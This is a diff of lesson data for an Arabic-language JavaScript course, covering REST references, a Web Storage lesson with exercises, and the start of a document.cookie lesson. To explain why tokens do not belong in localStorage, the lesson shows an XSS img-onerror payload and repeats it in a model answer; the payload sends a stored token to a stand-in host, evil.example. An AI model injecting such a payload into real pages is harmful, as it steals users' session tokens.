+- **[[max.trim() === ""]]:** [[Number("")]] = [[0]] مش [[NaN]]، فمن غير الشرط ده [[?maxPrice=]] كانت هترجّع الأصناف المجانية بس من غير error.
+- **[[url.searchParams.get]]** بيفك الـ encoding لوحده، فـ [[%D8%B4...]] بقت «شاي».
+- **الفلتر query string مش عنوان جديد:** لسه نفس الـ resource ([[/api/items]])، بس متفلتر. وده الشكل المتعارف عليه في REST.
+- **من الـ client:** [[fetch(API + "?" + new URLSearchParams({ maxPrice: 30, q: "شاي" }))]].` },
           ],
           ref: [
-            { t: "MDN: void operator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/void" },
-            { t: "ECMAScript: The void Operator", url: "https://tc39.es/ecma262/multipage/ecmascript-language-expressions.html#sec-void-operator" },
-            { t: "typescript-eslint: no-floating-promises", url: "https://typescript-eslint.io/rules/no-floating-promises/" },
+            { t: "MDN: REST", url: "https://developer.mozilla.org/en-US/docs/Glossary/REST" },
+            { t: "MDN: CRUD", url: "https://developer.mozilla.org/en-US/docs/Glossary/CRUD" },
+            { t: "MDN: HTTP request methods", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods" },
+            { t: "MDN: Idempotent", url: "https://developer.mozilla.org/en-US/docs/Glossary/Idempotent" },
+            { t: "MDN: HTTP response status codes", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status" },
+            { t: "MDN: Using the Fetch API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch" },
+            { t: "MDN: Response", url: "https://developer.mozilla.org/en-US/docs/Web/API/Response" },
+            { t: "MDN: Response.blob()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Response/blob" },
+            { t: "MDN: URL.createObjectURL()", url: "https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL_static" },
+            { t: "Node.js: HTTP", url: "https://nodejs.org/api/http.html" },
           ],
-          pre: ["js/function expression و class expression و expression statement", { to: "js/الأخطاء العامة: unhandledrejection و uncaughtException", why: R`الـ Promise المرفوضة اللي محدش مسكها` }, { to: "js/null و undefined", why: R`[[undefined]] نفسه` }],
+          pre: ["js/fetch و AbortController", { to: "start/HTTP: الطلب والرد", why: R`الطلب والرد والـ headers من الأساس` }, { to: "web/Status codes", why: R`كل كود معناه إيه وتشوفه فين في DevTools` }, { to: "node/node:http سيرفر من غير مكتبة", why: R`[[createServer]] و [[req]] و [[res]] اللي السيرفر هنا مبني عليهم` }],
+          deep: {
+            why: R`أي واجهة بتتكلم مع سيرفر بتعمل الأربع عمليات دول. لو فهمت الـ methods والـ status codes، هتقرا أي API documentation وتعرف تكتب الـ client بتاعه في دقايق، وهتعرف تفرّق بين «الطلب فشل» و «السيرفر قال لأ».`,
+            how: R`[[fetch]] بيبني طلب HTTP: سطر الـ method والعنوان، والـ headers، والـ body (نص أو بايتس). السيرفر بيقرا السطر ده ويختار الكود حسب الـ method والـ path، ويرجّع status و headers و body. [[res.json()]] بتقرا الـ body كله كـ stream وتعمل [[JSON.parse]]. و [[blob()]] بتحتفظ بالبايتس زي ما هي ومعاها [[Content-Type]].`,
+            when: R`REST لأي CRUD بسيط وواضح (لستات ونماذج). [[PATCH]] لما الفورم بيغيّر حقل أو اتنين، و [[PUT]] لما بتبعت العنصر كله (صفحة تعديل كاملة). [[blob()]] للصور والملفات اللي محتاجة auth أو preview. ولما الطلبات تبقى معقدة جدًا (شاشة محتاجة ١٠ resources) الناس بتروح لـ GraphQL أو endpoints مجمّعة.`,
+            mistakes: R`نسيان [[JSON.stringify]] أو [[Content-Type]]. [[res.json()]] من غير [[res.ok]]. [[json()]] على 204. قراية الـ body مرتين. أفعال في العنوان ([[/getItems]] و [[/deleteItem]]). 200 على كل حاجة والخطأ جوه الـ body. إعادة [[POST]] لوحدها بعد timeout. نسيان [[revokeObjectURL]].`,
+          },
+        },
+        {
+          cmd: "Web Storage: localStorage و sessionStorage",
+          title: "مفتاح وقيمة نص جوه المتصفح: يفضل بعد الـ reload، ويتشارك بين التابات، وأي سكربت يقراه",
+          desc: R`[[localStorage]] و [[sessionStorage]] (اسمهم مع بعض Web Storage) بيخزّنوا أزواج مفتاح وقيمة **نصوص بس** لكل origin. [[localStorage]] بيفضل لحد ما يتمسح، ومشترك بين كل التابات من نفس الموقع. [[sessionStorage]] لكل تاب لوحده، وبيعيش مع الـ reload وبيموت مع قفل التاب. الاتنين sync (بيوقفوا الصفحة لحد ما يخلصوا) وحدهم حوالي ٥ مليون حرف.
+• [[setItem(key, value)]] و [[getItem(key)]] ([[null]] لو مش موجود) و [[removeItem(key)]] و [[clear()]] و [[key(i)]] و [[length]].
+• أي قيمة بتتحوّل نص: [[false]] تبقى [["false"]] و object يبقى [["[object Object]"]]، فالـ objects بـ [[JSON.stringify]] و [[JSON.parse]].
+• الحدث [[storage]] بيوصل للتابات **التانية** لما تاب يغيّر حاجة.
+• [[QuotaExceededError]] لما المساحة تخلص، و [[SecurityError]] لما التخزين ممنوع (sandbox أو إعدادات).
+• أي JavaScript في الصفحة يقدر يقراه: متحطش فيه توكنز ولا أسرار.`,
+          example: R`localStorage.setItem("theme", "dark");
+localStorage.setItem("visits", 3);
+localStorage.setItem("cart", JSON.stringify([{ id: 1, qty: 2 }]));
+console.log(typeof localStorage.getItem("visits"), localStorage.getItem("nothing"));
+console.log(JSON.parse(localStorage.getItem("cart"))[0].qty);
+console.log(localStorage.length, localStorage.key(0));
+localStorage.removeItem("theme");
+sessionStorage.setItem("step", "2");
+addEventListener("storage", e => console.log(e.key, e.oldValue, e.newValue));`,
+          try: R`في صفحة من سيرفر محلي: اعمل [[localStorage.setItem("user", { name: "سارة" })]] و [[localStorage.setItem("flag", false)]] واقراهم. وبعدين افتح نفس الصفحة في تاب تاني: [[localStorage]] فيه إيه؟ و [[sessionStorage]]؟ وجرّب [[localStorage.getItem("user").name]].`,
+          sol: R`~~~text الناتج (Chrome 157)
+localStorage.getItem("user")           '[object Object]'
+localStorage.getItem("flag")           'false'
+localStorage.getItem("flag") ? 1 : 0   1
+التاب التاني: localStorage.getItem("flag")   'false'
+التاب التاني: sessionStorage.getItem("step") null
+localStorage.getItem("user").name      undefined
+~~~
+
+- الـ object اتحوّل بـ [[String()]] لـ [["[object Object]"]] واتخزّن كده. البيانات راحت، ومفيش error.
+- [["false"]] نص مش فاضي، فهو truthy: [[if]] عليه بيدخل (تمرين ٤).
+- التاب التاني شاف [[localStorage]] نفسه، بس [[sessionStorage]] بتاعه فاضي: كل تاب ليه واحد.
+- [[.name]] على نص = [[undefined]]. لازم [[JSON.parse]] الأول، واللي اتخزّن غلط مش هيرجع.`,
+          teach: R`## الفكرة
+
+كل origin (البروتوكول والدومين والبورت: [[http://localhost:8765]]) ليه درجين صغيرين في المتصفح، كل درج فيه أزواج «مفتاح: نص»:
+
+| | [[localStorage]] | [[sessionStorage]] |
+|---|---|---|
+| بيعيش لحد | ما اليوزر أو الكود يمسحه | التاب يتقفل (بيعيش مع الـ reload) |
+| مشترك بين التابات | آه، كل التابات من نفس الـ origin | لأ، كل تاب لوحده |
+| [[window.open]] من التاب | نفس الدرج | التاب الجديد بياخد **نسخة** (اتقاس: [["2"]]) |
+| بيتبعت للسيرفر | لأ | لأ |
+| الحد | حوالي ٥ مليون حرف (Chrome) | نفس الكلام |
+| sync | آه، بيوقف الصفحة | آه |
+
+[[http://localhost:8765]] و [[http://127.0.0.1:8765]] origins مختلفين: حطينا [["who"]] في الأول، والتاني شافه [[null]]. كل النواتج من Chrome 157 على صفحة من سيرفر محلي.
+
+---
+
+## ١. الـ API كله
+
+~~~text الناتج: المثال
+string null
+2
+3 theme
+~~~
+
+| الدالة | بتعمل | لو مش موجود |
+|---|---|---|
+| [[setItem(key, value)]] | بتخزّن (أو بتكتب فوق) | |
+| [[getItem(key)]] | بترجّع النص | [[null]] |
+| [[removeItem(key)]] | بتمسح مفتاح | مفيش error |
+| [[clear()]] | بتمسح كل مفاتيح الـ origin | |
+| [[key(i)]] | اسم المفتاح رقم [[i]] | [[null]] |
+| [[length]] | عدد المفاتيح | |
+
+**الترتيب مش ترتيب الإضافة:** ضفنا [[theme]] ثم [[visits]] ثم [[user]] ثم [[cart]]، و [[key(i)]] رجّعت [[theme,cart,user,visits]]. متعتمدش على [[key(i)]] لترتيب. [[Object.keys(localStorage)]] بترجّع نفس اللستة.
+
+**متكتبش [[localStorage.foo = "bar"]]:** بتشتغل (خصايص الـ Storage بتتحوّل مفاتيح)، بس مفتاح اسمه [[getItem]] أو [[length]] هيتلخبط مع الدوال. [[setItem]] و [[getItem]] دايمًا.
+
+---
+
+## ٢. نصوص بس
+
+~~~text الناتج
+setItem("visits", 3)           → getItem: '3' (string)
+setItem("user", { name: "سارة" }) → '[object Object]'
+setItem("flag", false)         → 'false' (truthy!)
+setItem("n", null)             → 'null'
+setItem("u", undefined)        → 'undefined'
+~~~
+
+أي قيمة بتعدّي على [[String(value)]]. فالقاعدة: **[[JSON.stringify]] وانت بتكتب، و [[JSON.parse]] وانت بتقرا**:
+
+~~~js saved.js
+const saved = {
+  load(key, fallback) {
+    try {
+      const text = localStorage.getItem(key);
+      return text === null ? fallback : JSON.parse(text);
+    } catch {
+      return fallback;
+    }
+  },
+  save(key, value) {
+    try {
+      localStorage.setItem(key, JSON.stringify(value));
+      return true;
+    } catch (err) {
+      console.log("مقدرتش أحفظ:", err.name);
+      return false;
+    }
+  },
+};
+~~~
+
+الـ [[try]] في الاتنين مش زيادة. الـ [[getItem]] نفسها ممكن ترمي (القسم الجاي)، و [[JSON.parse]] بترمي لو القيمة بايظة (كتبتها نسخة قديمة من كودك أو اليوزر عدّلها من DevTools). والـ [[setItem]] بترمي لو المساحة خلصت. وتفاصيل التعامل مع داتا محفوظة قديمة أو بايظة في درس «خلّي التطبيق يفتكر».
+
+**التواريخ:** [[JSON.stringify(new Date())]] بيرجّع نص ISO، و [[JSON.parse]] بيرجّعه نص مش [[Date]]: [[new Date(saved.load("lastVisit"))]].
+
+---
+
+## ٣. لما التخزين يرمي
+
+**المساحة خلصت:** ملينا [[localStorage]] بقطع كل واحدة مليون حرف:
+
+~~~text الناتج (Chrome 157)
+after 4 MB: QuotaExceededError: Failed to execute 'setItem' on 'Storage': Setting the value of 'big4' exceeded the quota. | code 22 | true
+arabic after 4
+~~~
+
+- القطعة الخامسة اترفضت: الحد حوالي ٥ مليون **حرف** للـ origin كله (المفاتيح والقيم مع بعض).
+- مليون حرف «ع» اترفضت عند نفس العدد بالظبط: Chrome بيعدّ حروف (UTF-16) مش بايتس UTF-8، فالعربي مش بياخد ضعف المساحة هنا.
+- [[e.name === "QuotaExceededError"]] هو الفحص الصح ([[code 22]] قديم).
+
+**التخزين ممنوع خالص:** صفحة جوه iframe عليه [[sandbox]] من غير [[allow-same-origin]] (زي الـ preview الحي في الموقع ده بالظبط)، أو يوزر قافل الـ site data:
+
+~~~text الناتج (Chrome 157، جوه الـ preview الحي بتاع الموقع)
+SecurityError: Failed to read the 'localStorage' property from 'Window': The document is sandboxed and lacks the 'allow-same-origin' flag.
+~~~
+
+لاحظ إن **مجرد قراية [[localStorage]]** بترمي، مش [[setItem]] بس. عشان كده تمرين ٢ والمشاريع بيلفّوا كل وصول في [[try]] ويكمّلوا من الذاكرة.
+
+**الوضع الخفي (Incognito):** في Chrome الـ [[localStorage]] شغال عادي، بس بيتمسح كله لما تقفل كل شبابيك الوضع الخفي. فمتعتمدش إن «المحفوظ» هيفضل.
+
+---
+
+## ٤. الحدث [[storage]]: تاب بيكلّم تاب
+
+تابين على نفس الصفحة، التاني بيسمع، والأول بيكتب:
+
+~~~js التاب الأول
+localStorage.setItem("theme", "dark");
+localStorage.setItem("theme", "light");
+localStorage.setItem("theme", "light");
+localStorage.removeItem("theme");
+localStorage.setItem("a", "1");
+localStorage.clear();
+~~~
+
+~~~text الناتج في التاب التاني: key | oldValue | newValue | url | storageArea === localStorage
+theme | null | dark | http://localhost:8765/ | true
+theme | dark | light | http://localhost:8765/ | true
+theme | light | null | http://localhost:8765/ | true
+a | null | 1 | http://localhost:8765/ | true
+null | null | null | http://localhost:8765/ | true
+~~~
+
+- **التاب اللي كتب مبيوصلوش الحدث** (عدّينا: صفر). الحدث للتابات التانية بس.
+- **نفس القيمة مرتين** ([["light"]] ثم [["light"]]) مطلّعتش حدث.
+- **[[clear()]]** بيطلّع حدث واحد [[key]] فيه [[null]].
+- **[[sessionStorage]]** مبيطلّعش أحداث لتابات تانية (كل تاب ليه واحد).
+
+الاستخدام: تسجيل خروج في تاب يخرّج الباقي، الثيم يتغيّر في كل التابات، العربة تتحدث (تمرين ٣). ولو عايز رسايل بين التابات من غير تخزين: [[BroadcastChannel]] (درس «IndexedDB و BroadcastChannel»).
+
+---
+
+## ٥. اللي ميتحطش فيه
+
+أي سكربت بيشتغل في الصفحة بيقرا [[localStorage]] كله في سطر. لو فيه ثغرة XSS واحدة (تعليق يوزر اتحط بـ [[innerHTML]] مثلًا: درس «innerHTML هي الباب»):
+
+~~~html
+<img src=x onerror="fetch('https://evil.example/?t=' + localStorage.getItem('token'))">
+~~~
+
+التوكن راح. ومفيش حاجة في [[localStorage]] تقدر تقفلها عن JavaScript. عشان كده:
+
+| ينفع | ميتحطش |
+|---|---|
+| الثيم، اللغة، حجم الخط، آخر تاب | توكن الـ login، أو أي session id |
+| مسودة فورم، فلاتر البحث | باسوردات، بيانات كارت، رقم قومي |
+| كاش لداتا عامة | داتا حساسة لأي يوزر (الجهاز ممكن يبقى مشترك) |
+
+التوكن مكانه كوكي [[HttpOnly]] (الدرس الجاي) اللي JavaScript مبيشوفهاش أصلًا. (وفك الـ JWT اللي في [[localStorage]] في درس «localStorage و JWT» بتاب الـ web.)
+
+---
+
+## الخلاصة
+
+| عايز | اكتب |
+|---|---|
+| تحفظ object | [[localStorage.setItem(k, JSON.stringify(v))]] |
+| تقراه بأمان | [[try { JSON.parse(localStorage.getItem(k)) ?? fallback } catch { fallback }]] |
+| لحد ما التاب يتقفل | [[sessionStorage]] |
+| تعرف إن تاب تاني غيّر | [[addEventListener("storage", e => ...)]] |
+| تمسح | [[removeItem(k)]] أو [[clear()]] |
+
+اللي ميتلخبطش: نصوص بس، و [[null]] للمفتاح المش موجود، و [[getItem]] نفسها ممكن ترمي، والحدث للتابات التانية بس، ومفيش أسرار.`,
+          lines: [
+            R`بنخزّن النص [["dark"]] تحت المفتاح [[theme]] للـ origin ده`,
+            R`الرقم ٣ بيتخزّن نص [["3"]]`,
+            R`array بيتحوّل JSON قبل ما يتخزّن`,
+            R`[["string"]]: أي قيمة بترجع نص، و [[null]] للمفتاح اللي مش موجود`,
+            R`[[JSON.parse]] بيرجّع الـ array، فـ [[qty]] = ٢ رقم`,
+            R`٣ مفاتيح، و [[key(0)]] اسم أول مفتاح في ترتيب المتصفح (مش ترتيب الإضافة)`,
+            R`بيمسح مفتاح [[theme]] بس والباقي زي ما هو، ولو مش موجود مبيرميش`,
+            R`[[sessionStorage]]: نفس الـ API، بس للتاب ده لحد ما يتقفل`,
+            R`بيسمع على التغييرات اللي تابات **تانية** بتعملها في [[localStorage]]`,
+          ],
+          practice: [
+            { lvl: 'سريع', t: R`**اقرا وتوقّع:** بعد [[setItem("visits", 3)]] و [[setItem("user", { name: "سارة" })]] و [[setItem("n", null)]] و [[setItem("u", undefined)]]: إيه اللي [[getItem]] هترجّعه لكل واحد؟ وإيه [[getItem("nothing")]]؟ اكتبهم بالتنصيص الصح (نص ولا [[null]]) (من قسم ٢ في الشرح).`, done: R`كتبت [["3"]] و [["[object Object]"]] و [["null"]] (نص) و [["undefined"]] و [[null]] (قيمة) قبل التشغيل.`, sol: R`~~~js الـ Console (صفحة من سيرفر محلي)
+localStorage.setItem("visits", 3);
+localStorage.setItem("user", { name: "سارة" });
+localStorage.setItem("n", null);
+localStorage.setItem("u", undefined);
+console.log(JSON.stringify([localStorage.getItem("visits"), localStorage.getItem("user"), localStorage.getItem("n"), localStorage.getItem("u"), localStorage.getItem("nothing")]));
+~~~
+
+~~~text الناتج (Chrome 157)
+["3","[object Object]","null","undefined",null]
+~~~
+
+- آخر واحدة بس [[null]] بجد (من غير تنصيص في الـ JSON): المفتاح مش موجود.
+- [["null"]] و [["undefined"]] نصوص من ٤ و ٩ حروف، فـ [[getItem("n") === null]] = [[false]]. ده باج شائع: حد بيعمل [[setItem("user", null)]] عشان «يمسح»، والمفروض [[removeItem("user")]].` },
+            { lvl: 'تطبيق', t: R`**ابني:** [[saved.load(key, fallback)]] و [[saved.save(key, value)]]: JSON في الاتجاهين، وقيمة افتراضية لو المفتاح مش موجود أو القيمة بايظة، و [[save]] بترجّع [[false]] بدل ما ترمي لو المساحة خلصت. جرّبها على عربة، وعلى قيمة بايظة [["{بايظ"]]، وعلى نص ٦ مليون حرف (من قسمي ٢ و ٣ في الشرح).`, done: R`العربة رجعت array والـ [[qty + 1]] = ٣، والبايظة رجّعت الـ fallback، والكبيرة رجّعت [[false]] ومطبوع [[QuotaExceededError]]، والصفحة مكمّلة.`, sol: R`~~~js saved.js (في صفحة من سيرفر محلي)
+const saved = {
+  load(key, fallback) {
+    try {
+      const text = localStorage.getItem(key);
+      return text === null ? fallback : JSON.parse(text);
+    } catch {
+      return fallback;
+    }
+  },
+  save(key, value) {
+    try {
+      localStorage.setItem(key, JSON.stringify(value));
+      return true;
+    } catch (err) {
+      console.log("مقدرتش أحفظ:", err.name);
+      return false;
+    }
+  },
+};
+localStorage.removeItem("cart");
+console.log(JSON.stringify(saved.load("cart", [])));
+saved.save("cart", [{ id: 1, qty: 2 }]);
+console.log(JSON.stringify(saved.load("cart", [])), saved.load("cart", [])[0].qty + 1);
+localStorage.setItem("cart", "{بايظ");
+console.log(JSON.stringify(saved.load("cart", [])));
+console.log(saved.save("big", "x".repeat(6 * 1024 * 1024)));
+~~~
+
+~~~text الناتج (Chrome 157)
+[]
+[{"id":1,"qty":2}] 3
+[]
+مقدرتش أحفظ: QuotaExceededError
+false
+~~~
+
+- **[[text === null ? fallback]]** قبل [[JSON.parse]]: لأن [[JSON.parse(null)]] بترجّع [[null]] (مش بترمي)، فمن غير الشرط كنت هتاخد [[null]] بدل [[[]]] وتقع في [[.push]] بعدين.
+- **[[catch]] من غير [[(err)]]** (optional catch binding) لما مش محتاج الخطأ.
+- **في الـ preview الحي** (sandbox): [[load]] بترجّع الـ fallback دايمًا و [[save]] بترجّع [[false]]، والصفحة شغالة. ده بالظبط سبب الـ [[try]].
+- **ناقص:** التحقق من الشكل. [[saved.load("cart", [])]] ممكن ترجّع object لو حد خزّن object. درس «خلّي التطبيق يفتكر» بيكمّل بالتحقق ورقم نسخة.` },
+            { lvl: 'تطبيق', t: R`**ابني:** عدّاد ضغطات متخزّن في [[localStorage]]، ولو فتحت الصفحة في تابين وضغطت في واحد، التاني يتحدث من غير reload (بالحدث [[storage]]). ولو [[clear()]] اتعمل في تاب، التاني يرجع صفر (من قسم ٤ في الشرح).`, done: R`٣ ضغطات في التاب الأول = ٣ في التاني، وضغطة في التاني = ٤ في الاتنين، و [[clear()]] في التاني رجّع الأول صفر.`, sol: R`~~~html counter.html
+<p id="count">0</p>
+<button id="plus" type="button">+1</button>
+<script>
+const countEl = document.querySelector("#count");
+const show = () => { countEl.textContent = localStorage.getItem("clicks") ?? "0"; };
+document.querySelector("#plus").addEventListener("click", () => {
+  localStorage.setItem("clicks", Number(localStorage.getItem("clicks") ?? 0) + 1);
+  show();
+});
+addEventListener("storage", e => {
+  if (e.key === "clicks" || e.key === null) show();
+});
+show();
+</script>
+~~~
+
+~~~text الناتج (Chrome 157، تابين في نفس الـ browser context من Playwright)
+بعد ٣ ضغطات في الأول:  tab1=3 tab2=3
+ضغطة في التاني:        tab1=4 tab2=4
+clear() في التاني:     tab1=0
+~~~
+
+- **[[show()]] بعد الضغطة في نفس التاب:** الحدث مش بيوصل للتاب اللي كتب، فلازم تحدّث بإيدك.
+- **[[e.key === null]]:** ده شكل حدث [[clear()]].
+- **[[?? "0"]] و [[?? 0]]:** أول مرة المفتاح مش موجود، و [[Number(null)]] = [[0]] أصلًا بس الـ [[??]] بيوضّح النية.
+- **فيه race:** لو التابين ضغطوا في نفس اللحظة بالظبط، الاتنين ممكن يقروا ٤ ويكتبوا ٥. Web Storage مفيهوش transactions. لعدّاد مهم استخدم IndexedDB أو السيرفر.` },
+            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[localStorage.setItem("darkMode", false); if (localStorage.getItem("darkMode")) document.body.classList.add("dark");]]. الصفحة بقت غامقة ليه؟ صلّحه بطريقتين (من قسم ٢ في الشرح).`, done: R`عرفت إن [["false"]] truthy، والطريقتين بيدّوا «فاتح».`, sol: R`~~~js dark-mode.js (في صفحة)
+localStorage.setItem("darkMode", false);
+console.log("بايظ:", localStorage.getItem("darkMode") ? "غامق" : "فاتح");
+console.log("صح:", localStorage.getItem("darkMode") === "true" ? "غامق" : "فاتح", JSON.parse(localStorage.getItem("darkMode")));
+~~~
+
+~~~text الناتج (Chrome 157)
+بايظ: غامق
+صح: فاتح false
+~~~
+
+- **[["false"]] نص فيه ٥ حروف**، وأي نص مش فاضي truthy.
+- **الطريقة ١:** قارن بالنص: [[=== "true"]].
+- **الطريقة ٢:** [[JSON.parse]] بيرجّع [[false]] الـ boolean (و [[JSON.stringify(false)]] وانت بتكتب للوضوح).
+- **الأحسن:** خزّن القيمة نفسها مش «هل»: [[setItem("theme", "dark")]]، فمفيش boolean أصلًا، وتقدر تزوّد [["system"]] بعدين.` },
+            { lvl: 'سريع', t: R`**اشرحها:** مدير المشروع عايز «تذكرني» بإن التوكن يتحفظ في [[localStorage]]. اكتبله في ٣ سطور الخطر بمثال، والبديل (من قسم ٥ في الشرح).`, done: R`فيه سطر الهجوم نفسه، والبديل كوكي [[HttpOnly]] بـ [[Max-Age]].`, sol: R`**إجابة نموذجية:**
+
+1. **الخطر:** أي JavaScript بيشتغل في الصفحة بيقرا [[localStorage]] كله. ثغرة XSS واحدة (اسم يوزر اتعرض بـ [[innerHTML]]، أو مكتبة من CDN اتخترقت) = [[fetch("https://evil.example/?t=" + localStorage.getItem("token"))]]، والمهاجم بقى داخل بحساب اليوزر من جهازه لحد ما التوكن يخلص.
+2. **مفيش قفل:** [[localStorage]] مالوش خاصية زي [[HttpOnly]] تخبّيه عن JS، ومالوش تاريخ انتهاء: بيفضل لحد ما حد يمسحه، حتى على جهاز مشترك.
+3. **البديل:** السيرفر يحط التوكن في كوكي [[HttpOnly; Secure; SameSite=Lax]]، و «تذكرني» = [[Max-Age]] أطول (٣٠ يوم مثلًا) بدل كوكي session. الـ JS مبيشوفهاش أصلًا، والمتصفح بيبعتها لوحده مع كل طلب. ([[localStorage]] يفضل للثيم والمسودة.)` },
+          ],
+          ref: [
+            { t: "MDN: Web Storage API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API" },
+            { t: "MDN: Window.localStorage", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" },
+            { t: "MDN: Window.sessionStorage", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage" },
+            { t: "MDN: Storage", url: "https://developer.mozilla.org/en-US/docs/Web/API/Storage" },
+            { t: "MDN: Window: storage event", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/storage_event" },
+            { t: "MDN: Storage quotas and eviction criteria", url: "https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria" },
+          ],
+          pre: [{ to: "js/خلّي التطبيق يفتكر", why: R`داتا محفوظة قديمة أو بايظة، والتحقق ورقم النسخة` }, { to: "web/localStorage و JWT", why: R`تشوف وتعدّل [[localStorage]] من Application في DevTools` }, "js/JSON", { to: "js/innerHTML هي الباب", why: R`الـ XSS اللي بيخلي [[localStorage]] مش مكان للأسرار` }],
+          deep: {
+            why: R`أسهل طريقة تخلي الصفحة «تفتكر» حاجة بعد الـ reload من غير سيرفر: الثيم، واللغة، والمسودة، وآخر بحث. وأسهل طريقة تعمل ثغرة لو حطيت فيه حاجة سرية.`,
+            how: R`المتصفح بيخزّن [[localStorage]] لكل origin في ملف على الديسك (في Chrome قاعدة LevelDB جوه البروفايل) ويحمّله في الذاكرة أول ما الصفحة تلمسه، فكل [[getItem]] sync. [[sessionStorage]] في الذاكرة مربوط بالتاب. ولما تاب يكتب، المتصفح بيبعت [[StorageEvent]] لكل الـ documents التانية من نفس الـ origin.`,
+            when: R`[[localStorage]] لتفضيلات صغيرة ومسودات بتعيش أيام. [[sessionStorage]] لحالة خطوات فورم أو فلتر بتاع التاب ده بس. ولأي حاجة كبيرة (صور، آلاف السجلات)، أو محتاجة worker، أو مش عايز تقفل الصفحة: IndexedDB (درس «تختار تخزين إيه»).`,
+            mistakes: R`تخزين object من غير [[JSON.stringify]]. [[if (getItem("flag"))]] على [["false"]]. [[JSON.parse]] من غير [[try]]. [[setItem(k, null)]] بدل [[removeItem]]. توكن أو باسورد. الاعتماد على ترتيب [[key(i)]]. توقّع إن الحدث [[storage]] بيوصل لنفس التاب. نسيان إن [[localhost]] و [[127.0.0.1]] origins مختلفين.`,
+          },
+        },
+        {
+          cmd: "document.cookie",
+          title: "الكوكيز من JavaScript: نص غريب بتكتبه كوكي كوكي، وبيتبعت للسيرفر مع كل طلب",
+          desc: R`الكوكي زوج «اسم=قيمة» صغير (لحد ٤٠٩٦ حرف) المتصفح بيخزّنه لدومين، و**بيبعته لوحده مع كل طلب** للسيرفر ده في header اسمه [[Cookie]]. عادة السيرفر هو اللي بيحطها بـ [[Set-Cookie]]، بس JavaScript يقدر يقرا ويكتب الكوكيز اللي مش [[HttpOnly]] بـ [[document.cookie]].
+• القراية: [[document.cookie]] = نص واحد [["a=1; b=2"]] فيه الأسامي والقيم بس.
+• الكتابة: [[document.cookie = "theme=dark; max-age=31536000; path=/; SameSite=Lax"]] بتضيف أو بتعدّل كوكي **واحدة**، مش بتمسح الباقي.
+• الخصايص: [[max-age]] أو [[expires]] (من غيرهم: تموت مع قفل المتصفح)، و [[path]]، و [[domain]]، و [[SameSite=Strict|Lax|None]]، و [[Secure]].
+• المسح: نفس الاسم ونفس [[path]] مع [[max-age=0]].
+• [[HttpOnly]] مبيتكتبش من JS، والكوكي اللي عليها مبتظهرش في [[document.cookie]] خالص.
+• القيمة: [[encodeURIComponent]] لأي حاجة فيها [[;]] أو مسافة أو عربي.
+• الحديث: [[cookieStore]] (Baseline 2025) بـ Promises و [[get]] و [[set]] و [[delete]] وحدث [[change]].`,
+          example: R`document.cookie = "theme=dark";
+document.cookie = "lang=ar; max-age=3600; path=/; SameSite=Lax";
+console.log(document.cookie);
+document.cookie = "theme=light";
+document.cookie = "city=" + encodeURIComponent("الجيزة; وسط البلد");
+document.cookie = "sid=hack; HttpOnly";
+console.log(document.cookie);
+document.cookie = "theme=; max-age=0";
+console.log(document.cookie);`,
+          try: R`شغّل المثال في Console صفحة من سيرفر محلي، وبعدين افتح DevTools: Application ثم Cookies. كل كوكي مكتوب جنبها Expires و Path و SameSite إيه؟ وفين [[sid]]؟`,
+          sol: R`~~~text الناتج (Chrome 157، http://localhost)
+theme=dark; lang=ar
+theme=light; city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF; lang=ar
+city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF; lang=ar
+~~~
+
+وفي Application ثم Cookies: [[lang]] ليها Expires بعد ساعة، و [[theme]] و [[city]] مكتوب «Session» (هتموت مع قفل المتصفح)، والـ Path [[/]] للكل، والـ SameSite فاضي (يعني الافتراضي Lax). و [[sid]] مش موجودة خالص: المتصفح رفض كوكي جاية من JS وعليها [[HttpOnly]].`,
+          teach: R`## الفكرة
+
+الكوكيز اتعملت عشان HTTP مالوش ذاكرة: كل طلب لوحده. فالسيرفر بيقول للمتصفح «احفظ ده»، والمتصفح بيرجّعه في كل طلب بعد كده:
+
+~~~text
+السيرفر ← المتصفح:  Set-Cookie: sid=abc123; HttpOnly; Path=/; SameSite=Lax
+المتصفح ← السيرفر:  Cookie: lang=ar; sid=abc123          (مع كل طلب لنفس الموقع)
+~~~
+
+ده الفرق الأساسي عن [[localStorage]]: **الكوكي بتسافر.** السيرفر بيشوفها قبل ما الصفحة توصل (الثيم من غير وميض، اللوجين)، بس كمان بتتقل كل طلب، وبتتبعت حتى للصور. كل النواتج من Chrome 157 على [[http://localhost:8765]] من سيرفر [[node:http]] صغير فيه [[/echo-cookie]] (بيرجّع الـ header [[Cookie]] اللي وصله) و [[/set-httponly]] (بيبعت [[Set-Cookie]]).
+
+---
+
+## ١. القراية: نص واحد
+
+~~~text الناتج: سطر ٣ في المثال
+theme=dark; lang=ar
+~~~
+
+[[document.cookie]] **getter** بيرجّع كل الكوكيز اللي JS مسموح يشوفها، مفصولة بـ [["; "]]، **الاسم والقيمة بس**: مفيش تاريخ انتهاء ولا path. عشان تجيب واحدة لازم تقسّم النص بنفسك:
+
+~~~js get-cookie.js
+function getCookie(name) {
+  for (const part of document.cookie.split("; ")) {
+    const i = part.indexOf("=");
+    if (part.slice(0, i) === name) return decodeURIComponent(part.slice(i + 1));
+  }
+  return null;
+}
+~~~
+
+ليه [[indexOf("=")]] مش [[split("=")]]: القيمة نفسها ممكن يبقى فيها [[=]] (base64 مثلًا). وليه المقارنة بالاسم كامل مش [[startsWith]]: [[getCookie("lang")]] كانت هتلاقي [[xlang=en]] (تمرين ١).
+
+---
+
+## ٢. الكتابة: كوكي واحدة كل مرة
+
